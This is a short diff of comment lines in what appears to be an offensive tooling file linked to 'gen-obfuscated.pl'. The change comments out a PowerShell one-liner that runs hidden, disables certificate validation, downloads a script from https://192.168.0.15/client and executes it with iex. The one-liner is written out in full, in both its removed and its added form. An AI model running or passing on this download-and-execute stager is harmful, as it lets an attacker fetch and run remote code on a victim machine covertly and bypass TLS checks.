@@ -61,7 +61,7 @@ gen-obfuscated.pl
 # OR
 #
 # A one-liner that supports a dowloadstring from a https site with a self-signed cert.
-cmd /c powershell.exe -w hidden -c "&{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};iex(New-Object System.Net.Webclient).DownloadString('https://192.168.0.15/client')}"
+# cmd /c powershell.exe -w hidden -c "&{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};iex(New-Object System.Net.Webclient).DownloadString('https://192.168.0.15/client')}"
 #
 # OR
 #
